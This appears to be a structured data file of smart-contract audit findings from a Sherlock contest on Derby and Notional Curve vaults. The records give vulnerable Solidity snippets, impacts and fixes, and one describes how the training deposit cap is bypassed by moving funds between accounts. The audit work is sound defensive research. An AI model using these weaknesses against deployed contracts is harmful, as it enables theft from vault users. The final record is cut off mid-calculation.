`getDecimals()` always call the MainNetчmediumч```\nuint256 newExchangeRate = (totalUnderlying * (10 ** decimals)) / totalSupply;\n```\nч`XChainController.pushVaultAmounts()` is to push `exchangeRate` to the vaults. `XChainController.getVaultAddress()` returns the vault address of `vaultNumber` with the given `chainID`\n`pushVaultAmounts()` invoke `xProvider.getDecimals()` internally to calculate `newExchangeRate`\nThe xProvider.getDecimals() is always call the `address(vault)` from the MainNet. but `address(vault)` could be in any chain `XChainController.pushVaultAmounts()` could keep reverting with all the `chainID` (only the MainNet will be correct ) or it will return the wrong `decimals` values. (if the `address(vault)` is for other chain/L but it exist in the MainNet with a decimals())\nthis will lead to a wrong `newExchangeRate`\n```\nuint256 newExchangeRate = (totalUnderlying * (10 ** decimals)) / totalSupply;\n```\nчYou should invoke `getVaultAddress()` with `_chain` of the Mainnet. because all vaults have the same getDecimals (not all vaultNamber)\nDiscussion\nCh-301\nEscalate for 10 USDC\nwe know that the `XChainController` is on the mainnet and it can only call `xProvider` on the same chain (mainnet).\nThe flow:\n`XChainController.pushVaultAmounts()` invoke `getVaultAddress()` internally\n`XChainController.getVaultAddress()` return the vault address of `vaultNumber` with the given `chainID`. So `getVaultAddress()` is not guarantee that the returned address is on the mainnet\nAfter that `XChainController.pushVaultAmounts()` invoke `xProvider.getDecimals()` internally\n```\n  /// @notice returns number of decimals for the vault\n  function getDecimals(address _vault) external view returns (uint256) {\n    return IVault(_vault).decimals();\n  }\n```\n\nAs we can see `xProvider.getDecimals()` only interact with the mainnet in this case. This will lead `XChainController.pushVaultAmounts()` to revert and break all rebalancing logic. I believe this issue should be valid.\nsherlock-admin\nEscalate for 10 USDC\nwe know that the `XChainController` is on the mainnet and it can only call `xProvider` on the same chain (mainnet).\nThe flow:\n`XChainController.pushVaultAmounts()` invoke `getVaultAddress()` internally\n`XChainController.getVaultAddress()` return the vault address of `vaultNumber` with the given `chainID`. So `getVaultAddress()` is not guarantee that the returned address is on the mainnet\nAfter that `XChainController.pushVaultAmounts()` invoke `xProvider.getDecimals()` internally\n`  /// @notice returns number of decimals for the vault\n  function getDecimals(address _vault) external view returns (uint256) {\n    return IVault(_vault).decimals();\n  }`\nAs we can see `xProvider.getDecimals()` only interact with the mainnet in this case. This will lead `XChainController.pushVaultAmounts()` to revert and break all rebalancing logic. I believe this issue should be valid.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nTheezr\nThis is a valid medium issue.\nhrishibhat\nEscalation accepted\nConsidering this issue a valid medium\nsherlock-admin\nEscalation accepted\nConsidering this issue a valid medium\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.ч"`pushVaultAmounts()` will keep reverting and this will break all rebalancing logic\nCode Snippet\n```\n  function pushVaultAmounts(\n    uint256 _vaultNumber,\n    uint16 _chain\n  ) external payable onlyWhenUnderlyingsReceived(_vaultNumber) {\n    address vault = getVaultAddress(_vaultNumber, _chain);\n    require(vault != address(0), ""xChainController: not a valid vaultnumber"");\n    /*// rest of code*/\n\n    uint256 decimals = xProvider.getDecimals(vault);\n    uint256 newExchangeRate = (totalUnderlying * (10 ** decimals)) / totalSupply;\n\n    /*// rest of code*/\n  }\n```\n\nTool used\nManual Review"
User should not receive rewards for the rebalance period, when protocol was blacklisted, because of unpredicted behaviour of protocol priceчmediumч```\n  function storePriceAndRewards(uint256 _totalUnderlying, uint256 _protocolId) internal {\n    uint256 currentPrice = price(_protocolId);\n    if (lastPrices[_protocolId] == 0) {\n      lastPrices[_protocolId] = currentPrice;\n      return;\n    }\n\n\n    int256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n    int256 nominator = (int256(_totalUnderlying * performanceFee) * priceDiff);\n    int256 totalAllocatedTokensRounded = totalAllocatedTokens / 1E18;\n    int256 denominator = totalAllocatedTokensRounded * int256(lastPrices[_protocolId]) * 100; // * 100 cause perfFee is in percentages\n\n\n    if (totalAllocatedTokensRounded == 0) {\n      rewardPerLockedToken[rebalancingPeriod][_protocolId] = 0;\n    } else {\n      rewardPerLockedToken[rebalancingPeriod][_protocolId] = nominator / denominator;\n    }\n\n\n    lastPrices[_protocolId] = currentPrice;\n  }\n```\nчUser should not receive rewards for the rebalance period, when protocol was blacklisted, because of unpredicted behaviour of protocol price.\nWhen user allocates derby tokens to some underlying protocol, he receive rewards according to the exchange price of that protocols token. This reward can be positive or negative. Rewards of protocol are set to `Game` contract inside `settleRewards` function and they are accumulated for user, once he calls `rebalanceBasket`.\n```\n  function storePriceAndRewards(uint256 _totalUnderlying, uint256 _protocolId) internal {\n    uint256 currentPrice = price(_protocolId);\n    if (lastPrices[_protocolId] == 0) {\n      lastPrices[_protocolId] = currentPrice;\n      return;\n    }\n\n\n    int256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n    int256 nominator = (int256(_totalUnderlying * performanceFee) * priceDiff);\n    int256 totalAllocatedTokensRounded = totalAllocatedTokens / 1E18;\n    int256 denominator = totalAllocatedTokensRounded * int256(lastPrices[_protocolId]) * 100; // * 100 cause perfFee is in percentages\n\n\n    if (totalAllocatedTokensRounded == 0) {\n      rewardPerLockedToken[rebalancingPeriod][_protocolId] = 0;\n    } else {\n      rewardPerLockedToken[rebalancingPeriod][_protocolId] = nominator / denominator;\n    }\n\n\n    lastPrices[_protocolId] = currentPrice;\n  }\n```\n\nEvery time, previous price of protocol is compared with current price.\nIn case if some protocol is hacked, there is `Vault.blacklistProtocol` function, that should withdraw reserves from protocol and mark it as blacklisted. The problem is that because of the hack it's not possible to determine what will happen with exhange rate of protocol. It can be 0, ot it can be very small or it can be high for any reasons. But protocol still accrues rewards per token for protocol, even that it is blacklisted. Because of that, user that allocated to that protocol can face with accruing very big negative or positive rewards. Both this cases are bad.\nSo i believe that in case if protocol is blacklisted, it's better to set rewards as 0 for it.\nExample. 1.User allocated 100 derby tokens for protocol A 2.Before `Vault.rebalance` call, protocol A was hacked which made it exchangeRate to be not real. 3.Derby team has blacklisted that protocol A. 4.Vault.rebalance is called which used new(incorrect) exchangeRate of protocol A in order to calculate `rewardPerLockedToken` 5.When user calls rebalance basket next time, his rewards are accumulated with extremely high/low value.ч
The protocol could not handle multiple vaults correctlyчmediumч```\n  function rebalanceNeeded() public view returns (bool) {\n    return (block.timestamp - lastTimeStamp) > rebalanceInterval || msg.sender == guardian;\n  }\n```\nч"The protocol needs to handle multiple vaults correctly. If there are three vaults (e.g.USDC, USDT, DAI) the protocol needs to rebalance them all without any problems\nThe protocol needs to invoke pushAllocationsToController() every `rebalanceInterval` to push totalDeltaAllocations from Game to xChainController.\n`pushAllocationsToController()` invoke `rebalanceNeeded()` to check if a rebalance is needed based on the set interval and it uses the state variable `lastTimeStamp` to do the calculations\n```\n  function rebalanceNeeded() public view returns (bool) {\n    return (block.timestamp - lastTimeStamp) > rebalanceInterval || msg.sender == guardian;\n  }\n```\n\nBut in the first invoking (for USDC vault) of `pushAllocationsToController()` it will update the state variable `lastTimeStamp` to the current `block.timestamp`\n```\nlastTimeStamp = block.timestamp;\n```\n\nNow when you invoke (for DAI vault) `pushAllocationsToController()`. It will revert because of\n```\nrequire(rebalanceNeeded(), ""No rebalance needed"");\n```\n\nSo if the protocol has two vaults or more (USDC, USDT, DAI) you can only do one rebalance every `rebalanceInterval`"чKeep tracking the `lastTimeStamp` for every `_vaultNumber` by using an arrayч"The protocol could not handle multiple vaults correctly\nBoth Users and Game players will lose funds because the MainVault will not rebalance the protocols at the right time with the right values\nCode Snippet\n```\n  function pushAllocationsToController(uint256 _vaultNumber) external payable {\n    require(rebalanceNeeded(), ""No rebalance needed"");\n    for (uint k = 0; k < chainIds.length; k++) {\n      require(\n        getVaultAddress(_vaultNumber, chainIds[k]) != address(0),\n        ""Game: not a valid vaultnumber""\n      );\n      require(\n        !isXChainRebalancing[_vaultNumber][chainIds[k]],\n        ""Game: vault is already rebalancing""\n      );\n      isXChainRebalancing[_vaultNumber][chainIds[k]] = true;\n    }\n```\n\nTool used\nManual Review"
Vault.blacklistProtocol can revert in emergencyчmediumч```\n  function blacklistProtocol(uint256 _protocolNum) external onlyGuardian {\n    uint256 balanceProtocol = balanceUnderlying(_protocolNum);\n    currentAllocations[_protocolNum] = 0;\n    controller.setProtocolBlacklist(vaultNumber, _protocolNum);\n    savedTotalUnderlying -= balanceProtocol;\n    withdrawFromProtocol(_protocolNum, balanceProtocol);\n  }\n```\nчVault.blacklistProtocol can revert in emergency, because it tries to withdraw underlying balance from protocol, which can revert for many reasons after it's hacked or paused.\n```\n  function blacklistProtocol(uint256 _protocolNum) external onlyGuardian {\n    uint256 balanceProtocol = balanceUnderlying(_protocolNum);\n    currentAllocations[_protocolNum] = 0;\n    controller.setProtocolBlacklist(vaultNumber, _protocolNum);\n    savedTotalUnderlying -= balanceProtocol;\n    withdrawFromProtocol(_protocolNum, balanceProtocol);\n  }\n```\n\nThe problem is that this function is trying to withdraw all balance from protocol. This can create problems as in case of hack, attacker can steal funds, pause protocol and any other things that can make `withdrawFromProtocol` function to revert. Because of that it will be not possible to add protocol to blacklist and as result system will stop working correctly.ч"
Game doesn't accrued rewards for previous rebalance period in case if rebalanceBasket is called in next periodчmediumч```\n  function addToTotalRewards(uint256 _basketId) internal onlyBasketOwner(_basketId) {\n    if (baskets[_basketId].nrOfAllocatedTokens == 0) return;\n\n\n    uint256 vaultNum = baskets[_basketId].vaultNumber;\n    uint256 currentRebalancingPeriod = vaults[vaultNum].rebalancingPeriod;\n    uint256 lastRebalancingPeriod = baskets[_basketId].lastRebalancingPeriod;\n\n\n    if (currentRebalancingPeriod <= lastRebalancingPeriod) return;\n\n\n    for (uint k = 0; k < chainIds.length; k++) {\n      uint32 chain = chainIds[k];\n      uint256 latestProtocol = latestProtocolId[chain];\n      for (uint i = 0; i < latestProtocol; i++) {\n        int256 allocation = basketAllocationInProtocol(_basketId, chain, i) / 1E18;\n        if (allocation == 0) continue;\n\n\n        int256 lastRebalanceReward = getRewardsPerLockedToken(\n          vaultNum,\n          chain,\n          lastRebalancingPeriod,\n          i\n        );\n        int256 currentReward = getRewardsPerLockedToken(\n          vaultNum,\n          chain,\n          currentRebalancingPeriod,\n          i\n        );\n        baskets[_basketId].totalUnRedeemedRewards +=\n          (currentReward - lastRebalanceReward) *\n          allocation;\n      }\n    }\n  }\n```\nчGame doesn't accrued rewards for previous rebalance period in case if `rebalanceBasket` is called in next period. Because of that user do not receive rewards for the previous period and in case if he calls `rebalanceBasket` each rebalance period, he will receive rewards only for last one.\n```\n  function addToTotalRewards(uint256 _basketId) internal onlyBasketOwner(_basketId) {\n    if (baskets[_basketId].nrOfAllocatedTokens == 0) return;\n\n\n    uint256 vaultNum = baskets[_basketId].vaultNumber;\n    uint256 currentRebalancingPeriod = vaults[vaultNum].rebalancingPeriod;\n    uint256 lastRebalancingPeriod = baskets[_basketId].lastRebalancingPeriod;\n\n\n    if (currentRebalancingPeriod <= lastRebalancingPeriod) return;\n\n\n    for (uint k = 0; k < chainIds.length; k++) {\n      uint32 chain = chainIds[k];\n      uint256 latestProtocol = latestProtocolId[chain];\n      for (uint i = 0; i < latestProtocol; i++) {\n        int256 allocation = basketAllocationInProtocol(_basketId, chain, i) / 1E18;\n        if (allocation == 0) continue;\n\n\n        int256 lastRebalanceReward = getRewardsPerLockedToken(\n          vaultNum,\n          chain,\n          lastRebalancingPeriod,\n          i\n        );\n        int256 currentReward = getRewardsPerLockedToken(\n          vaultNum,\n          chain,\n          currentRebalancingPeriod,\n          i\n        );\n        baskets[_basketId].totalUnRedeemedRewards +=\n          (currentReward - lastRebalanceReward) *\n          allocation;\n      }\n    }\n  }\n```\n\nThis function allows user to accrue rewards only when currentRebalancingPeriod > `lastRebalancingPeriod`. When user allocates, he allocates for the next period. And `lastRebalancingPeriod` is changed after `addToTotalRewards` is called, so after rewards for previous period accrued. And when allocations are sent to the xController, then new rebalance period is started. So actually rewards accruing for period that user allocated for is started once `pushAllocationsToController` is called. And at this point currentRebalancingPeriod == `lastRebalancingPeriod` which means that if user will call rebalanceBasket for next period, the rewards will not be accrued for him, but `lastRebalancingPeriod` will be incremented. So actually he will not receive rewards for previous period.\nExample. 1.currentRebalancingPeriod is 10. 2.user calls `rebalanceBasket` with new allocation and `lastRebalancingPeriod` is set to 11 for him. 3.pushAllocationsToController is called, so `currentRebalancingPeriod` becomes 11. 4.settleRewards is called, so rewards for the 11th cycle are accrued. 5.now user can call `rebalanceBasket` for the next 12th cycle. `addToTotalRewards` is called, but `currentRebalancingPeriod` == `lastRebalancingPeriod` == 11, so rewards were not accrued for 11th cycle 6.new allocations is saved and `lastRebalancingPeriod` becomes 12. 7.the loop continues and every time when user allocates for next rewards his `lastRebalancingPeriod` is increased, but rewards are not added. 8.user will receive his rewards for previous cycle, only if he skip 1 rebalance period(he doesn't allocate on that period).\nAs you can see this is very serious bug. Because of that, player that wants to adjust his allocation every rebalance period will loose all his rewards.чFirst of all, you need to allows to call `rebalanceBasket` only once per rebalance period, before new rebalancing period started and allocations are sent to xController. Then you need to change check inside `addToTotalRewards` to this `if (currentRebalancingPeriod < lastRebalancingPeriod) return;` in order to allow accruing for same period.чPlayer looses all his rewards\nCode Snippet\nProvided above\nTool used\nManual Review
MainVault.rebalanceXChain doesn't check that savedTotalUnderlying >= reservedFundsчmediumч```\n  function rebalanceXChain(uint256 _slippage, uint256 _relayerFee) external payable {\n    require(state == State.SendingFundsXChain, stateError);\n\n\n    if (amountToSendXChain > getVaultBalance()) pullFunds(amountToSendXChain);\n    if (amountToSendXChain > getVaultBalance()) amountToSendXChain = getVaultBalance();\n\n\n    vaultCurrency.safeIncreaseAllowance(xProvider, amountToSendXChain);\n    IXProvider(xProvider).xTransferToController{value: msg.value}(\n      vaultNumber,\n      amountToSendXChain,\n      address(vaultCurrency),\n      _slippage,\n      _relayerFee\n    );\n\n\n    emit RebalanceXChain(vaultNumber, amountToSendXChain, address(vaultCurrency));\n\n\n    amountToSendXChain = 0;\n    settleReservedFunds();\n  }\n```\nчMainVault.rebalanceXChain doesn't check that savedTotalUnderlying >= reservedAmount. Because of that, shortage can occur, if vault will lose some underlying during cross chain calls and reservedFundswill not be present in the vault.\n`reservedFunds` is the amount that is reserved to be withdrawn by users. It's increased by `totalWithdrawalRequests` amount every cycle, when `setXChainAllocation` is called.\n`setXChainAllocation` call is initiated by xController. This call provides vault with information about funds. In case if vault should send funds to the xController, then `SendingFundsXChain` state is set, aslo amount to send is stored.\n```\n  function rebalanceXChain(uint256 _slippage, uint256 _relayerFee) external payable {\n    require(state == State.SendingFundsXChain, stateError);\n\n\n    if (amountToSendXChain > getVaultBalance()) pullFunds(amountToSendXChain);\n    if (amountToSendXChain > getVaultBalance()) amountToSendXChain = getVaultBalance();\n\n\n    vaultCurrency.safeIncreaseAllowance(xProvider, amountToSendXChain);\n    IXProvider(xProvider).xTransferToController{value: msg.value}(\n      vaultNumber,\n      amountToSendXChain,\n      address(vaultCurrency),\n      _slippage,\n      _relayerFee\n    );\n\n\n    emit RebalanceXChain(vaultNumber, amountToSendXChain, address(vaultCurrency));\n\n\n    amountToSendXChain = 0;\n    settleReservedFunds();\n  }\n```\n\nAs you can see, function just pulls needed funds from providers if needed and sends them to xController. It doesn't check that after that amount that is held by vault is enough to cover `reservedFunds`. Because of that next situation can occur.\n1.Suppose that vault has 1000 tokens as underlying amount. 2.reservedFunds is 200. 3.xController calculated that vault should send 800 tokens to xController(vault allocations is 0) and 200 should be still in the vault in order to cover `reservedFunds`. 4.when vault is going to send 800 tokens(between `setXChainAllocation` and `rebalanceXChain` call), then loss happens and totalUnderlying becomes 800, so currently vault has only 800 tokens in total. 5.vault sends this 800 tokens to xController and has 0 to cover `reservedFunds`, but actually he should leave this 200 tokens in the vault in this case.\n```\n    if (amountToSendXChain > getVaultBalance()) pullFunds(amountToSendXChain);\n    if (amountToSendXChain > getVaultBalance()) amountToSendXChain = getVaultBalance();\n```\n\nI think that this is incorrect approach for withdrawing of funds as there is a risk that smth will happen with underlying amount in the providers, so it will be not enough to cover `reservedFunds` and calculations will be broken, users will not be able to withdraw. Same approach is done in `rebalance` function, which pulls `reservedFunds` after depositing to all providers. I guess that correct approach is not to touch `reservedFunds` amount. In case if you need to send amount to xController, then you need to withdraw it directly from provider. Of course if you have `getVaultBalance` that is bigger than `reservedFunds` + amountToSendXChain, then you can send them directly, without pulling.чYou need to check that after you send funds to xController it's enough funds to cover `reservedFunds`.чReserved funds protection can be broken\nCode Snippet\nProvided above\nTool used\nManual Review
maxTrainingDeposit can be bypassedчmediumч```\nfunction deposit(\n    uint256 _amount,\n    address _receiver\n  ) external nonReentrant onlyWhenVaultIsOn returns (uint256 shares) {\n    if (training) {\n      require(whitelist[msg.sender]);\n      uint256 balanceSender = (balanceOf(msg.sender) * exchangeRate) / (10 ** decimals());\n      require(_amount + balanceSender <= maxTrainingDeposit);\n    }\n// rest of code\n```\nчIt was observed that User can bypass the `maxTrainingDeposit` by transferring balance from one user to another\nObserve the `deposit` function\n```\nfunction deposit(\n    uint256 _amount,\n    address _receiver\n  ) external nonReentrant onlyWhenVaultIsOn returns (uint256 shares) {\n    if (training) {\n      require(whitelist[msg.sender]);\n      uint256 balanceSender = (balanceOf(msg.sender) * exchangeRate) / (10 ** decimals());\n      require(_amount + balanceSender <= maxTrainingDeposit);\n    }\n// rest of code\n```\n\nSo if User balance exceeds maxTrainingDeposit then request fails (considering training is true)\nLets say User A has balance of 50 and maxTrainingDeposit is 100\nIf User A deposit amount 51 then it fails since 50+51<=100 is false\nSo User A transfer amount 50 to his another account\nNow when User A deposit, it does not fail since `0+51<=100`ч
Slippage/Minimum amount does not work during single-side redemptionчhighч```\nminPrimary = (poolContext.primaryBalance * poolClaim * strategyContext.vaultSettings.poolSlippageLimitPercent /  (totalPoolSupply * uint256(VaultConstants.VAULT_PERCENT_BASIS)\nminPrimary = (50 DAI * 50 LP_TOKEN * 99.75% /  (100 LP_TOKEN * 100%)\n\nRewrite for clarity (ignoring rounding error):\nminPrimary = 50 DAI * (50 LP_TOKEN/100 LP_TOKEN) * (99.75%/100%) = 24.9375 DAI\n\nminSecondary = same calculation = 74.8125 USDC\n```\nчThe slippage or minimum amount of tokens to be received is set to a value much smaller than expected due to the use of `TwoTokenPoolUtils._getMinExitAmounts` function to automatically compute the slippage or minimum amount on behalf of the callers during a single-sided redemption. As a result, the vault will continue to redeem the pool tokens even if the trade incurs significant slippage, resulting in the vault receiving fewer tokens in return, leading to losses for the vault shareholders.\nThe `Curve2TokenConvexHelper._executeSettlement` function is called by the following functions:\n`Curve2TokenConvexHelper.settleVault`\n`Curve2TokenConvexHelper.settleVault` function is called within the `Curve2TokenConvexVault.settleVaultNormal` and `Curve2TokenConvexVault.settleVaultPostMaturity` functions\n`Curve2TokenConvexHelper.settleVaultEmergency`\n`Curve2TokenConvexHelper.settleVaultEmergency` is called by `Curve2TokenConvexVault.settleVaultEmergency`\nIn summary, the `Curve2TokenConvexHelper._executeSettlement` function is called during vault settlement.\nAn important point to note here is that within the `Curve2TokenConvexHelper._executeSettlement` function, the `params.minPrimary` and `params.minSecondary` are automatically computed and overwritten by the `TwoTokenPoolUtils._getMinExitAmounts` function (Refer to Line 124 below). Therefore, if the caller attempts to define the `params.minPrimary` and `params.minSecondary`, they will be discarded and overwritten. The `params.minPrimary` and `params.minSecondary` is for slippage control when redeeming the Curve's LP tokens.\nThe `TwoTokenPoolUtils._getMinExitAmounts` function calculates the minimum amount on the share of the pool with a small discount.\nAssume a Curve Pool with the following configuration:\nConsist of two tokens (DAI and USDC). DAI is primary token, USDC is secondary token.\nPool holds 200 US Dollars worth of tokens (50 DAI and 150 USDC).\nDAI <> USDC price is 1:1\ntotalSupply = 100 LP Pool Tokens\nAssume that 50 LP Pool Tokens will be claimed during vault settlement.\n```\nminPrimary = (poolContext.primaryBalance * poolClaim * strategyContext.vaultSettings.poolSlippageLimitPercent /  (totalPoolSupply * uint256(VaultConstants.VAULT_PERCENT_BASIS)\nminPrimary = (50 DAI * 50 LP_TOKEN * 99.75% /  (100 LP_TOKEN * 100%)\n\nRewrite for clarity (ignoring rounding error):\nminPrimary = 50 DAI * (50 LP_TOKEN/100 LP_TOKEN) * (99.75%/100%) = 24.9375 DAI\n\nminSecondary = same calculation = 74.8125 USDC\n```\n\n`TwoTokenPoolUtils._getMinExitAmounts` function will return `24.9375 DAI` as `params.minPrimary` and `74.8125 USDC` as `params.minSecondary`.\nWhen settling the vault, it is possible to instruct the vault to redeem the Curve's LP tokens single-sided or proportionally. Settle vault functions will trigger a chain of functions that will eventually call the `Curve2TokenConvexHelper._unstakeAndExitPool` function that is responsible for redeeming the Curve's LP tokens.\nWithin the `Curve2TokenConvexHelper._unstakeAndExitPool` function, if the `params.secondaryTradeParams.length` is zero, the redemption will be single-sided (refer to Line 242 below). Otherwise, the redemption will be executed proportionally (refer to Line 247 below). For a single-sided redemption, only the `params.minPrimary` will be used.\nAssume that the caller decided to perform a single-sided redemption of 50 LP Pool Tokens, using the earlier example. In this case,\n`poolClaim` = 50 LP Pool Tokens\n`params.minPrimary` = 24.9375 DAI\n`params.minSecondary` = 74.8125 USDC\nThe data passed into the `remove_liquidity_one_coin` will be as follows:\n```\n@notice Withdraw a single coin from the pool\n@param _token_amount Amount of LP tokens to burn in the withdrawal\n@param i Index value of the coin to withdraw\n@param _min_amount Minimum amount of coin to receive\n@return Amount of coin received\ndef remove_liquidity_one_coin(\n    _token_amount: uint256,\n    i: int128,\n    _min_amount: uint256\n) -> uint256:\n```\n\n```\nremove_liquidity_one_coin(poolClaim, int8(poolContext.basePool.primaryIndex), params.minPrimary);\nremove_liquidity_one_coin(50 LP_TOKEN, Index 0=DAI, 24.9375 DAI);\n```\n\nAssume the pool holds 200 US dollars worth of tokens (50 DAI and 150 USDC), and the total supply is 100 LP Tokens. The pool's state is imbalanced, so any trade will result in significant slippage.\nIntuitively (ignoring the slippage & fee), redeeming 50 LP Tokens should return approximately 100 US dollars worth of tokens, which means around 100 DAI. Thus, the slippage or minimum amount should ideally be around 100 DAI (+/- 5%).\nHowever, the trade will be executed in the above example even if the vault receives only 25 DAI because the `params.minPrimary` is set to `24.9375 DAI`. This could result in a loss of around 75 DAI due to slippage (about 75% slippage rate) in the worst-case scenario.ч
Reinvest will return sub-optimal return if the pool is imbalancedчhighч```\ndef add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> uint256:\n..SNIP..\n    if token_supply > 0:\n        # Only account for fees if we are not the first to deposit\n        fee: uint256 = self.fee * N_COINS / (4 * (N_COINS - 1))\n        admin_fee: uint256 = self.admin_fee\n        for i in range(N_COINS):\n            ideal_balance: uint256 = D1 * old_balances[i] / D0\n            difference: uint256 = 0\n            if ideal_balance > new_balances[i]:\n                difference = ideal_balance - new_balances[i]\n            else:\n                difference = new_balances[i] - ideal_balance\n            fees[i] = fee * difference / FEE_DENOMINATOR\n            if admin_fee != 0:\n                self.admin_balances[i] += fees[i] * admin_fee / FEE_DENOMINATOR\n            new_balances[i] -= fees[i]\n        D2 = self.get_D(new_balances, amp)\n        mint_amount = token_supply * (D2 - D0) / D0\n    else:\n        mint_amount = D1  # Take the dust if there was any\n..SNIP..\n```\nчReinvesting only allows proportional deposit. If the pool is imbalanced due to unexpected circumstances, performing a proportional deposit is not optimal. This result in fewer pool tokens in return due to sub-optimal trade, eventually leading to a loss of gain for the vault shareholder.\nDuring reinvest rewards, the vault will ensure that the amount of primary and secondary tokens deposited is of the right proportion per the comment in Line 163 below.\nThe `Curve2TokenConvexHelper.reinvestReward` function will internally call the `Curve2TokenPoolUtils._checkPrimarySecondaryRatio`, which will check that the primary and secondary tokens deposited are of the right proportion.\nThis concept of proportional join appears to be taken from the design of earlier Notional's Balancer leverage vaults. For Balancer Pools, it is recommended to join with all the pool's tokens in exact proportions to minimize the price impact of the join (Reference).\nHowever, the concept of proportional join to minimize slippage does not always hold for Curve Pools as they operate differently.\nA Curve pool is considered imbalanced when there is an imbalance between the assets within it. For instance, the Curve stETH/ETH pool is considered imbalanced if it has the following reserves:\nETH: 340,472.34 (31.70%)\nstETH: 733,655.65 (68.30%)\nIf a Curve Pool is imbalanced, attempting to perform a proportional join will not give an optimal return (e.g. result in fewer Pool LP tokens received).\nIn Curve Pool, there are penalties/bonuses when depositing to a pool. The pools are always trying to balance themselves. If a deposit helps the pool to reach that desired balance, a deposit bonus will be given (receive extra tokens). On the other hand, if a deposit deviates from the pool from the desired balance, a deposit penalty will be applied (receive fewer tokens).\nThe following is the source code of `add_liquidity` function taken from https://github.com/curvefi/curve-contract/blob/master/contracts/pools/steth/StableSwapSTETH.vy. As shown below, the function attempts to calculate the `difference` between the `ideal_balance` and `new_balances`, and uses the `difference` as a factor of the fee computation, which is tied to the bonus and penalty.\n```\ndef add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> uint256:\n..SNIP..\n    if token_supply > 0:\n        # Only account for fees if we are not the first to deposit\n        fee: uint256 = self.fee * N_COINS / (4 * (N_COINS - 1))\n        admin_fee: uint256 = self.admin_fee\n        for i in range(N_COINS):\n            ideal_balance: uint256 = D1 * old_balances[i] / D0\n            difference: uint256 = 0\n            if ideal_balance > new_balances[i]:\n                difference = ideal_balance - new_balances[i]\n            else:\n                difference = new_balances[i] - ideal_balance\n            fees[i] = fee * difference / FEE_DENOMINATOR\n            if admin_fee != 0:\n                self.admin_balances[i] += fees[i] * admin_fee / FEE_DENOMINATOR\n            new_balances[i] -= fees[i]\n        D2 = self.get_D(new_balances, amp)\n        mint_amount = token_supply * (D2 - D0) / D0\n    else:\n        mint_amount = D1  # Take the dust if there was any\n..SNIP..\n```\n\nFollowing is the mathematical explanation of the penalties/bonuses extracted from Curve's Discord channel:\nThere is a “natural” amount of D increase that corresponds to a given total deposit amount; when the pool is perfectly balanced, this D increase is optimally achieved by a balanced deposit. Any other deposit proportions for the same total amount will give you less D.\nHowever, when the pool is imbalanced, a balanced deposit is no longer optimal for the D increase.ч"Consider removing the `_checkPrimarySecondaryRatio` function from the `_validateSpotPriceAndPairPrice` function to give the callers the option to deposit the reward tokens in a ""non-proportional"" manner if a Curve Pool becomes imbalanced so that the deposit penalty could be minimized or the deposit bonus can be exploited to increase the return.\nDiscussion\njeffywu\nValid, should get the optimal way to join via some off chain function for Curve pools. This is will work because we are using a permissioned reward reinvestment role."чThere is no guarantee that a Curve Pool will always be balanced. Historically, there are multiple instances where the largest Curve pool (stETH/ETH) becomes imbalanced (Reference #1 and #2).\nIf the pool is imbalanced due to unexpected circumstances, performing a proportional deposit is not optimal, leading to the trade resulting in fewer tokens than possible due to the deposit penalty. In addition, the trade also misses out on the potential gain from the deposit bonus.\nThe side-effect is that reinvesting the reward tokens will result in fewer pool tokens in return due to sub-optimal trade, eventually leading to a loss of gain for the vault shareholder.\nCode Snippet\nTool used\nManual Review
Curve vault will undervalue or overvalue the LP Pool tokens if it comprises tokens with different decimalsчhighч```\nprimaryBalance = poolContext.primaryBalance * poolClaim / totalSupply; // 100 DAI * 50 / 100\nsecondaryBalance = poolContext.secondaryBalance * poolClaim / totalSupply; // 100 USDC * 50 / 100\n```\nчA Curve vault that comprises tokens with different decimals will undervalue or overvalue the LP Pool tokens. As a result, users might be liquidated prematurely or be able to borrow more than they are allowed. Additionally, the vault settlement process might break.\nThe `TwoTokenPoolUtils._getTimeWeightedPrimaryBalance` function, which is utilized by the Curve vault, is used to compute the total value of the LP Pool tokens (poolClaim) denominated in the primary token.\nIf a leverage vault supports a Curve Pool that contains two tokens with different decimals, the math within the `TwoTokenPoolUtils._getTimeWeightedPrimaryBalance` function would not work, and the value returned from it will be incorrect. Consider the following two scenarios:\nIf primary token's decimals (e.g. 18) > secondary token's decimals (e.g. 6)\nTo illustrate the issue, assume the following:\nThe leverage vault supports the DAI-USDC Curve Pool, and its primary token of the vault is DAI.\nDAI's decimals are 18, while USDC's decimals are 6.\nCurve Pool's total supply is 100\nThe Curve Pool holds 100 DAI and 100 USDC\nFor the sake of simplicity, the price of DAI and USDC is 1:1. Thus, the `oraclePrice` within the function will be `1 * 10^18`. Note that the oracle price is always scaled up to 18 decimals within the vault.\nThe caller of the `TwoTokenPoolUtils._getTimeWeightedPrimaryBalance` function wanted to compute the total value of 50 LP Pool tokens.\n```\nprimaryBalance = poolContext.primaryBalance * poolClaim / totalSupply; // 100 DAI * 50 / 100\nsecondaryBalance = poolContext.secondaryBalance * poolClaim / totalSupply; // 100 USDC * 50 / 100\n```\n\nThe `primaryBalance` will be `50 DAI`. `50 DAI` denominated in WEI will be `50 * 10^18` since the decimals of DAI are 18.\nThe `secondaryBalance` will be `50 USDC`. `50 USDC` denominated in WEI will be `50 * 10^6` since the decimals of USDC are 6.\nNext, the code logic attempts to value the secondary balance (50 USDC) in terms of the primary token (DAI) using the oracle price (1 * 10^18).\n```\nsecondaryAmountInPrimary = secondaryBalance * strategyContext.poolClaimPrecision / oraclePrice;\nsecondaryAmountInPrimary = 50 USDC * 10^18 / (1 * 10^18)\nsecondaryAmountInPrimary = (50 * 10^6) * 10^18 / (1 * 10^18)\nsecondaryAmountInPrimary = 50 * 10^6\n```\n\n50 USDC should be worth 50 DAI (50 * 10^18). However, the `secondaryAmountInPrimary` shows that it is only worth 0.00000000005 DAI (50 * 10^6).\n```\nprimaryAmount = (primaryBalance + secondaryAmountInPrimary) * primaryPrecision / strategyContext.poolClaimPrecision;\nprimaryAmount = [(50 * 10^18) + (50 * 10^6)] * 10^18 / 10^18\nprimaryAmount = [(50 * 10^18) + (50 * 10^6)] // cancel out the 10^18\nprimaryAmount = 50 DAI + 0.00000000005 DAI = 50.00000000005 DAI\n```\n\n50 